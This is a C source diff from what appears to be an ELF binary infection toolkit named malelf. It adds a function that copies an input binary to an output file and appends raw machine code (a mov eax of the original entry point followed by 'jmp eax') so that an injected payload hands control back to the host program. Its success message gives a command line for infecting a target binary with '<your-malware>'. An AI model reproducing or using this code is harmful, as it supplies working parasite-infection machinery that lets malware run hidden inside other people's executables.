@@ -6,12 +6,57 @@
 extern int fileno(FILE*);
 #endif
 
+#include <malelf/object.h>
 #include <malelf/defines.h>
 #include <malelf/util.h>
 #include <malelf/error.h>
 #include <malelf/types.h>
+#include <malelf/infect.h>
 
-_u8 shellcode_create(FILE* fd_o,
+_i32 shellcode_create_malelficus(FILE* fd_o,
+                     int in_size,
+                     FILE* fd_i,
+                                 unsigned long int original_entry_point,
+                                 unsigned long int magic_bytes) {
+  _u8 *mem = NULL;
+  _i32 count = 0;
+
+  union malelf_dword entry_point;
+
+  if (original_entry_point > 0) {
+      entry_point.long_val = original_entry_point;
+  } else if (magic_bytes != 0x00) {
+      entry_point.long_val = magic_bytes;
+  } else {
+      entry_point.long_val = MALELF_MAGIC_BYTES;
+  }
+  
+  mem = mmap(0, in_size, PROT_READ, MAP_SHARED, fileno(fd_i), 0);
+  if (mem == MAP_FAILED) {
+    LOG_ERROR("Failed to map binary in memory...\n");
+    return MALELF_EALLOC;
+  }
+
+  while (count < in_size) {
+      count += fwrite(mem + count, sizeof(_u8), 1, fd_o);
+  }
+
+  fwrite("\xb8", sizeof(_u8), 1, fd_o);
+  count++;
+  fwrite(&entry_point.char_val[0], 1, 1, fd_o);
+  fwrite(&entry_point.char_val[1], 1, 1, fd_o);
+  fwrite(&entry_point.char_val[2], 1, 1, fd_o);
+  fwrite(&entry_point.char_val[3], 1, 1, fd_o);
+  /* jmp eax */
+  fwrite("\xff\xe0", sizeof(_u8), 2, fd_o);
+
+  LOG_SUCCESS("New shellcode created successfully\n");
+  LOG_SUCCESS("Now you can use: malelf infect -m 0 -f %d -p <your-malware> -i <binary-to-infect> -o <infected-file>\n", count);
+
+  return MALELF_SUCCESS;
+}
+
+_u8 shellcode_create_c(FILE* fd_o,
                      int in_size,
                      FILE* fd_i,
                      unsigned long int original_entry_point) {
